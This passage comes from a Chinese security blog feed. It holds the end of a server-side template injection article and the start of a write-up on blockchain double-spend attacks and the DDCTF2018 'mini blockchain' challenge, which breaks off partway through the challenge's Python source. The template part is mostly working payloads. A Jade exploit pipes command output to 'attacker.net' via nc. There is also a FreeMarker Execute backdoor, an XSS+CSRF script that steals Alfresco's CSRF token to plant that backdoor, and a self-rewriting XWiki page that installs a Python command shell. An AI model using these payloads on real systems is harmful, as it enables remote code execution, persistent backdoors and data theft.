<span class="token punctuation">-</span><span class="token code"> <span class="token function">x</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></span>
<span class="token tag">Cannot</span> <span class="token plain-text">find module 'a'</span></code></pre>
<p>最终 exp：</p>
<pre class=" language-jade"><code class="language-jade"><span class="token punctuation">-</span><span class="token code"> <span class="token keyword">var</span> x <span class="token operator">=</span> root<span class="token punctuation">.</span>process</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> x<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>require</span>
<span class="token punctuation">-</span><span class="token code"> x <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span></span>
<span class="token punctuation">=</span><span class="token code"> x<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'id | nc attacker.net 80'</span><span class="token punctuation">)</span></span></code></pre>
<p><img src="https://pic3.zhimg.com/80/v2-1ef32d510c3f13a531e57e5efcc43e66_720w.jpg" alt="img"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a><strong>实战</strong></h2><h2 id="Alfresco"><a href="#Alfresco" class="headerlink" title="Alfresco"></a><strong>Alfresco</strong></h2><p>Alfresco 是一个用户在线合作类的 CMS。地权限用户能通过评论区的 XSS 来得到运行该 CMS 的服务器 Shell。先前 Freemaker 的  Payload 在此处可以不加修改地利用。不过我在此处将之前的 payload 换成用了一个经典后门：</p>
<pre class=" language-text"><code class="language-text"><#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}</code></pre>
<p>底权限用户不能编辑模板。不过我们可以用 XSS+CSRF 来让管理员帮我们修改：</p>
<pre class=" language-text"><code class="language-text">tok = /Alfresco-CSRFToken=([^;]*)/.exec(document.cookie)[1];
tok = decodeURIComponent(tok)
do_csrf = new XMLHttpRequest();
do_csrf.open("POST","http://"+document.domain+":8080/share/proxy/alfresco/api/node/workspace
/SpacesStore/59d3cbdc-70cb-419e-a325-759a4c307304/formprocessor",false);
do_csrf.setRequestHeader('Content-Type','application/json; charset=UTF-8');
do_csrf.setRequestHeader('Alfresco-CSRFToken',tok);
do_csrf.send('{"prop_cm_name":"folder.get.html.ftl","prop_cm_content":"&lgt;#assign
ex=\\"freemarker.template.utility.Execute\\"?new()> ${
ex(url.getArgs())}","prop_cm_description":""}');</code></pre>
<h2 id="XWiki-Enterprise"><a href="#XWiki-Enterprise" class="headerlink" title="XWiki Enterprise"></a><strong>XWiki Enterprise</strong></h2><p>XWiki 不仅支持 Velocity（有沙箱），还可以运行 Groovy 和 Python（沒有沙箱）。但是只有特权用户才能编辑后两者，我们有什么方法插入没有沙箱保护的模板呢？</p>
<p>我们来看看它的 $doc 类，有经验的读者不难推测出它的问题：</p>
<p><img src="https://pic2.zhimg.com/80/v2-b3781ab567854ee7884b1d2425df0f0d_720w.jpg" alt="img"></p>
<p>save 和 saveAsAuthor 意味着：save 保存的作者是按最后一个观看页面的人决定的（而不一定是作者）。我们就可以创建一个可以自修改的页面，当特权用户浏览时，它就修改并保存自己：</p>
<pre class=" language-velocity"><code class="language-velocity">innocent content
{{velocity}}
#if( $doc.hasAccessLevel("programming") )
  $doc.setContent("
    innocent content
    {{python}}from subprocess import check_output
    q = request.get('q') or 'true'
    q = q.split(' ')
    print ''+check_output(q)+''
    {{/python}}
  ")
  $doc.save()
#end
{{/velocity}}</code></pre>
<p>当这个页面被特权用户浏览时，后门就会被触发。之后任意用户都可以用该页面执行命令了。</p>
<p><img src="https://pic3.zhimg.com/80/v2-944d76a8db9b58f8ce98b8d521e66f6e_720w.jpg" alt="img"></p>
]]></content>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链及双花攻击原理/UTXO/DDCTF2018：mini blockchain</title>
    <url>/2021/11/15/qu-kuai-lian-ji-shuang-hua-gong-ji-yuan-li-utxo-ddctf2018-mini-blockchain/</url>
    <content><![CDATA[<h1 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h1><p>其实并没有什么比特币，只有 UTXO：</p>
<p><a href="https://www.chainnode.com/tutorial/4381">https://www.chainnode.com/tutorial/4381</a></p>
<p>UTXO原理：</p>
<p><a href="https://www.zhihu.com/question/59913301">https://www.zhihu.com/question/59913301</a></p>
<h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><p>从零开始构建一个区块链:</p>
<p><a href="https://zhuanlan.zhihu.com/p/29875875">https://zhuanlan.zhihu.com/p/29875875</a></p>
<p>看一张交易模型：</p>
<p>![image-20211115170900135](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211115170900135.png)</p>
<p>区块链由区块和链构成，每次交易输出输入必须相同</p>
<h2 id="双花攻击"><a href="#双花攻击" class="headerlink" title="双花攻击"></a>双花攻击</h2><p>双花攻击是同一笔UTXO在不同交易中的花费，双花不会产生新的货币，只能把自己花出去的钱重新拿回来。</p>
<p>如何进行51% attack攻击？</p>
<p><strong>创造一条超过原始链的长度</strong></p>
<h1 id="Python2-安装-RSA"><a href="#Python2-安装-RSA" class="headerlink" title="Python2 安装 RSA"></a>Python2 安装 RSA</h1><h2 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h2><p>下载<code>ez_setup.py</code></p>
<p><a href="http://peak.telecommunity.com/dist/ez_setup.py">http://peak.telecommunity.com/dist/ez_setup.py</a></p>
<p>python2执行</p>
<p>下载<code>rsa-3.1.1-py2.7.egg</code>并复制到D:\Python27\Scripts目录下，该目录下执行</p>
<p><a href="https://pypi.org/project/rsa/3.1.1/#files">https://pypi.org/project/rsa/3.1.1/#files</a></p>
<pre><code>easy_install.exe rsa-3.1.1-py2.7.egg</code></pre>
<h2 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h2><p>1.</p>
<pre><code>sudo python ez_setup.py</code></pre>
<p>2.</p>
<pre><code>sudo easy_install rsa-3.1.1-py2.7.egg</code></pre>
<h1 id="DDCTF2018：mini-blockchain"><a href="#DDCTF2018：mini-blockchain" class="headerlink" title="DDCTF2018：mini blockchain"></a>DDCTF2018：mini blockchain</h1><p>![image-20211101145544001](区块链及双花攻击原理-UTXO-DDCTF2018：mini blockchain.assets/image-20211101145544001.png)</p>
<pre class=" language-json"><code class="language-json">Announcement<span class="token operator">:</span> The server has been restarted at <span class="token number">21</span><span class="token operator">:</span><span class="token number">45</span> <span class="token number">04</span>/<span class="token number">17</span>. All blockchain have been reset. View source code

hash of genesis block<span class="token operator">:</span> 3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962

the bank's addr<span class="token operator">:</span> b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b<span class="token punctuation">,</span> 
the hacker's addr<span class="token operator">:</span> a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b<span class="token punctuation">,</span> 
the shop's addr<span class="token operator">:</span> d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071

Balance of all addresses<span class="token operator">:</span><span class="token punctuation">{</span>
    <span class="token property">"d2510c299359754f6a2c86069a674538f265c1c3c6808c8da0b751f427ffe6291073ddf0a220f4954b358bd9c52a0071"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
    <span class="token property">"b780aa1fba896158371edc45168f681608ae1315f9a2de3e3c9d85489c36bb22dbd8efcd9473e8fa5c4250d3df4f125b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
    <span class="token property">"a7b568edbcc8a9c395555642bdff0fcaf3772e50f6565264ab661f2e23b5bcb361501713fc9ab1d81197893502055a4b"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     
    <span class="token property">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
    <span class="token property">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">}</span>

All utxos<span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token property">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
        <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

Blockchain Explorer<span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"HAHA, I AM THE BANK NOW!"</span><span class="token punctuation">,</span> 
        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span>
        <span class="token property">"hash"</span><span class="token operator">:</span><span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"0f808f1d3b6016c2f5a06e00602c3d4ffaac76efb04eb97f8ff9f76ed745b58f357ad7dab38d33bc7229f7b1df158034"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"7ce1d7a76757c181593b3e02433b24d05d86133ca0c9c5bcb46371e3846f0fbe"</span><span class="token punctuation">,</span> 
            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">999999</span><span class="token punctuation">,</span> 
                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"0ede005c512d4d8cca71ed0bc32733472b5bf4128ce4812e5f4b31be1f345a64"</span><span class="token punctuation">,</span> 
                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8c0fb4f8d1af7953b2c31449a1791781e91f1ad26255e19706810ff0d61717c0e6d4264dd2307a5aba1ddcd92f48c1e7"</span><span class="token punctuation">,</span> 
                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"375c1f2b-58b9-4282-a3bd-8e9b7591b236"</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> 
                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8aca42fcc869e9bc9910cf1c762c533ff7ef688cce362eb0e0abcad5ac686bc5"</span><span class="token punctuation">,</span> 
                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"621d14eb-8be4-4a1a-aeba-3abc077b9892"</span>
            <span class="token punctuation">}</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token property">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"a empty block"</span><span class="token punctuation">,</span> 
        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"108248f604c2b0ba842c9bc897e1adecf27c6e66a92d243b57f1805ddd9fe369"</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"e92b1df81deac2217847b89de1d38e4b06c19d58aa95a5fed6413c629c2eb616"</span><span class="token punctuation">,</span> 
        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">2</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token property">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">"nonce"</span><span class="token operator">:</span> <span class="token string">"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank"</span><span class="token punctuation">,</span> 
        <span class="token property">"prev"</span><span class="token operator">:</span> <span class="token string">"0000000000000000000000000000000000000000000000000000000000000000"</span><span class="token punctuation">,</span> 
        <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"3eac8fa8280955626ceb82ade9b07250e77518e9ba2c4736af4f299ec00dd962"</span><span class="token punctuation">,</span> 
        <span class="token property">"transactions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
            <span class="token property">"input"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"signature"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
            <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"c3a654c05dc934708f962d78dd795768132256a7d64c866439975a43024e15ec"</span><span class="token punctuation">,</span> 
            <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span>
                <span class="token property">"amount"</span><span class="token operator">:</span> <span class="token number">1000000</span><span class="token punctuation">,</span> 
                <span class="token property">"hash"</span><span class="token operator">:</span> <span class="token string">"8cb6994bbb901d94bda4388669f42c65a08685526e977d2a09ae69568d590aca"</span><span class="token punctuation">,</span> 
                <span class="token property">"addr"</span><span class="token operator">:</span> <span class="token string">"8393de0e73705cb1aa4121db3c629c06cd8ca6d55bdca622e2d6cce3ab3b053b1b6ab969adc0be73f7a302e9378ad8b7"</span><span class="token punctuation">,</span> 
                <span class="token property">"id"</span><span class="token operator">:</span> <span class="token string">"845e6673-ad33-4645-97f6-ef4f8895e82c"</span>
            <span class="token punctuation">}</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 
        <span class="token property">"height"</span><span class="token operator">:</span> <span class="token number">0</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>参数解释，括号内为生成函数</p>
<ul>
<li><p>nonce：自定义字符串</p>
</li>
<li><p>prev：上一个块的hash</p>
</li>
<li><p>hash：本个块的hash（hashhash，hash_reducer，hash_block）</p>
</li>
<li><p>transactions：交易（tx）</p>
</li>
<li><p>input：之前utxo的id</p>
</li>
<li><p>output：UTXO</p>
</li>
<li><p>amount：数量</p>
</li>
<li><p>hash：UTXO的hash（hash，hash_reducer，hash_utxo）</p>
</li>
<li><p>id：这个UTXO的id</p>
</li>
<li><p>addr：目标地址</p>
</li>
<li><p>hash：交易的hash（hash，hash_reducer，hash_tx）</p>
</li>
<li><p>signature：交易签名（sign_input_utxo）</p>
<h2 id="utxos"><a href="#utxos" class="headerlink" title="utxos"></a>utxos</h2><ul>
<li>其实就是地址余额，利用这个独立于区块链的数据结构来存储交易最终各个地址的余额</li>
<li>使得区块链系统中的新交易并不需要追溯整个交易历史，就可以确认当前交易是否合法</li>
</ul>
<pre><code>  {
    "amount":余额,
    "addr":钱包地址,
    "id":标识每一个utxo的id,
    "hash":根据以上三个数据生成的hash
  }</code></pre>
<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p>区块block</p>
<pre><code>  {
    "nonce":调和参数,
    "prev":前块hash,
    "hash":本块hash,
    "transactions":交易记录
  }</code></pre>
<p>交易记录transactions</p>
<pre><code>  {
    "input":付款钱包utxos的id,
    "output":收款钱包地址的utxos,
    "signature":付款地址的签名，由付款钱包的utxos中id和私钥计算生成,
    "hash":由input和付款钱包的utxos中id计算出的交易hash
  }</code></pre>
</li>
</ul>
<h2 id="View-source-code"><a href="#View-source-code" class="headerlink" title="View source_code:"></a>View source_code:</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- encoding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># written in python 2.7</span>
__author__ <span class="token operator">=</span> <span class="token string">'garzon'</span>

<span class="token keyword">import</span> hashlib<span class="token punctuation">,</span> json<span class="token punctuation">,</span> rsa<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request
<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> PyCallGraph  
<span class="token keyword">from</span> pycallgraph <span class="token keyword">import</span> Config  
<span class="token keyword">from</span> pycallgraph<span class="token punctuation">.</span>output <span class="token keyword">import</span> GraphvizOutput 

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>
url_prefix <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Here is your flag: DDCTF{******************}'</span>

<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">hash_reducer</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hash<span class="token punctuation">(</span>hash<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span>hash<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">has_attrs</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> attrs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> type<span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Input should be a dict/JSON"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> attr <span class="token keyword">in</span> attrs<span class="token punctuation">:</span>
        <span class="token keyword">if</span> attr <span class="token operator">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"{} should be presented in the input"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>

EMPTY_HASH <span class="token operator">=</span> <span class="token string">'0'</span><span class="token operator">*</span><span class="token number">64</span>

<span class="token keyword">def</span> <span class="token function">addr_to_pubkey</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>PublicKey<span class="token punctuation">(</span>int<span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">65537</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">pubkey_to_address</span><span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> pubkey<span class="token punctuation">.</span>e <span class="token operator">==</span> <span class="token number">65537</span>
    hexed <span class="token operator">=</span> hex<span class="token punctuation">(</span>pubkey<span class="token punctuation">.</span>n<span class="token punctuation">)</span>
    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> hexed<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> hexed <span class="token operator">=</span> hexed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> hexed

<span class="token keyword">def</span> <span class="token function">gen_addr_key_pair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pubkey<span class="token punctuation">,</span> privkey <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">384</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> pubkey_to_address<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey

bank_address<span class="token punctuation">,</span> bank_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
hacker_address<span class="token punctuation">,</span> hacker_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
shop_address<span class="token punctuation">,</span> shop_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>
shop_wallet_address<span class="token punctuation">,</span> shop_wallet_privkey <span class="token operator">=</span> gen_addr_key_pair<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sign_input_utxo</span><span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> rsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>input_utxo_id<span class="token punctuation">,</span> privkey<span class="token punctuation">,</span> <span class="token string">'SHA-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">hash_utxo</span><span class="token punctuation">(</span>utxo<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_output_utxo</span><span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>
    utxo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'addr'</span><span class="token punctuation">:</span> addr_to<span class="token punctuation">,</span> <span class="token string">'amount'</span><span class="token punctuation">:</span> amount<span class="token punctuation">}</span>
    utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>
    <span class="token keyword">return</span> utxo

<span class="token keyword">def</span> <span class="token function">hash_tx</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>
        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">,</span>
        reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_tx</span><span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> output_utxo<span class="token punctuation">,</span> privkey_from<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
    tx <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'input'</span><span class="token punctuation">:</span> input_utxo_ids<span class="token punctuation">,</span> <span class="token string">'signature'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>sign_input_utxo<span class="token punctuation">(</span>id<span class="token punctuation">,</span> privkey_from<span class="token punctuation">)</span> <span class="token keyword">for</span> id <span class="token keyword">in</span> input_utxo_ids<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">:</span> output_utxo<span class="token punctuation">}</span>
    tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>
    <span class="token keyword">return</span> tx

<span class="token keyword">def</span> <span class="token function">hash_block</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reduce<span class="token punctuation">(</span>hash_reducer<span class="token punctuation">,</span> <span class="token punctuation">[</span>tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> EMPTY_HASH<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_block</span><span class="token punctuation">(</span>prev_block_hash<span class="token punctuation">,</span> nonce_str<span class="token punctuation">,</span> transactions<span class="token punctuation">)</span><span class="token punctuation">:</span>
